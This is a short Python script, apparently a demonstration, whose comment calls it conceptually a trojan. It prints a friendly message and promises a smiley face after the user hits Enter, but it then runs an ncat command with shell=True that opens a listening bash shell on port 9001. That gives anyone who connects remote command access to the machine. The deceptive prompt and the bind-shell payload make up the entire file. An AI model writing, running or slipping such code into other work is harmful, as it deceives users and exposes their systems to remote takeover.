import subprocess

# Conceptually, this python script acts the same as a trojan. 

print("Hello world")

print("Hit enter to see a smiley face")

input()

command = "ncat -lnp 9001 -e /bin/bash"  

subprocess.call(command, shell=True)
